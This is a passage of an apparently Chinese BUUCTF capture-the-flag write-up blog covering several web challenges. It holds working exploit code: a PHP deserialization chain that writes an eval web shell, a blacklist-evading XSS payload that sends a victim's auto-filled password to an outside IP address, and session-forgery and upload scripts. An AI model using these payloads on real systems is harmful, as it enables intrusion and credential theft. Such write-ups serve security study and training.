</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">store</span><span class="o">=</span><span class="nv">$store</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;serialize&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;base64_decode&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;data_compress&#39;</span><span class="p">]</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">complete</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gwctf-2019mypassword">[GWCTF 2019]mypassword
</h2><p>æ³¨å†Œç™»å…¥åæŸ¥çœ‹feedback.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$feedback</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">				<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;åé¦ˆä¸åˆæ³•&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s1">&#39;#&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">,</span><span class="s1">&#39;input&#39;</span><span class="p">,</span><span class="s1">&#39;script&#39;</span><span class="p">,</span><span class="s1">&#39;iframe&#39;</span><span class="p">,</span><span class="s1">&#39;host&#39;</span><span class="p">,</span><span class="s1">&#39;onload&#39;</span><span class="p">,</span><span class="s1">&#39;onerror&#39;</span><span class="p">,</span><span class="s1">&#39;srcdoc&#39;</span><span class="p">,</span><span class="s1">&#39;location&#39;</span><span class="p">,</span><span class="s1">&#39;svg&#39;</span><span class="p">,</span><span class="s1">&#39;form&#39;</span><span class="p">,</span><span class="s1">&#39;img&#39;</span><span class="p">,</span><span class="s1">&#39;src&#39;</span><span class="p">,</span><span class="s1">&#39;getElement&#39;</span><span class="p">,</span><span class="s1">&#39;document&#39;</span><span class="p">,</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">			<span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		        <span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		            <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$feedback</span><span class="p">,</span><span class="nv">$val</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		                <span class="nv">$feedback</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$feedback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		            <span class="p">}</span>
</span></span><span class="line"><span class="cl">		        <span class="p">}</span>
</span></span><span class="line"><span class="cl">		    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é»‘åå•ä¸€çœ‹å°±æ˜¯xss</p>
<p>ç”±äºå‰é¢login.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">&amp;&amp;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">cookies</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nx">cookie</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="s2">&#34;undefined&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®°ä½å¯†ç åŠŸèƒ½ä¼šå°†è¯»å–cookieä¸­çš„password</p>
<p>äºæ˜¯æ„é€ ä¸€ä¸ªç™»å½•æ¡†å¹¶ä¸”å¼•å…¥login.jsæäº¤åé¦ˆç­‰å¾…botç‚¹å¼€è·å¾—flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">incookieput</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;username&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">incookieput</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;password&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">scrcookieipt</span> <span class="n">scookierc</span><span class="o">=</span><span class="s2">&#34;./js/login.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="n">psw</span> <span class="o">=</span> <span class="n">docucookiement</span><span class="o">.</span><span class="n">getcookieElementsByName</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">docucookiement</span><span class="o">.</span><span class="n">locacookietion</span><span class="o">=</span><span class="s2">&#34;http://47.122.53.248:2333/?psw=&#34;</span><span class="o">+</span><span class="n">psw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hfctf2020babyupload">[HFCTF2020]BabyUpload
</h2><p>æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_save_path</span><span class="p">(</span><span class="s2">&#34;/var/babyctf/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;/flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/var/babyctf/success.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">safe_delete</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$direction</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;direction&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$attr</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;attr&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dir_path</span> <span class="o">=</span> <span class="s2">&#34;/var/babyctf/&#34;</span><span class="o">.</span><span class="nv">$attr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$attr</span><span class="o">===</span><span class="s2">&#34;private&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dir_path</span> <span class="o">.=</span> <span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">&#34;upload&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid upload&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">.=</span> <span class="s2">&#34;_&#34;</span><span class="o">.</span><span class="nx">hash_file</span><span class="p">(</span><span class="s2">&#34;sha256&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid file path&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir_path</span><span class="p">,</span> <span class="mo">0700</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$upload_result</span> <span class="o">=</span> <span class="s2">&#34;uploaded&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;error while saving&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$upload_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">&#34;download&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;filename&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid file path&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;file not exist&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/force-download&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span><span class="o">.</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">65</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">readfile</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$download_result</span> <span class="o">=</span> <span class="s2">&#34;downloaded&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;error while saving&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$download_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºsessionæ˜¯PHPSESSIDæˆ‘ä»¬ç›´æ¥sess_sessidæŸ¥çœ‹sessionæ–‡ä»¶</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940.png"
	width="1893"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940_hu16537395824893143893.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940_hu12031525414134795751.png 1024w"
	loading="lazy"
	
		alt="image-20250506191720940"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="656px"
	
></p>
<p>å¤„ç†å™¨åº”è¯¥ä¸ºphp_binary</p>
<p>è„šæœ¬ä¼ªé€ sessionæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_binary&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_save_path</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ–‡ä»¶åæ”¹ä¸ºsessï¼Œåˆ©ç”¨hash_fileæ¥è®¡ç®—sha256</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">hash_file</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="s1">&#39;./sess&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°æ–‡ä»¶åsess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>ä¸Šä¼ ç”¨postman</p>
<p>æˆ–è€…è„šæœ¬ä¼ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">BeAdmin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(BytesIO(&#39;\x08usernames:5:&#34;admin&#34;;&#39;.encode(&#39;utf-8&#39;)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
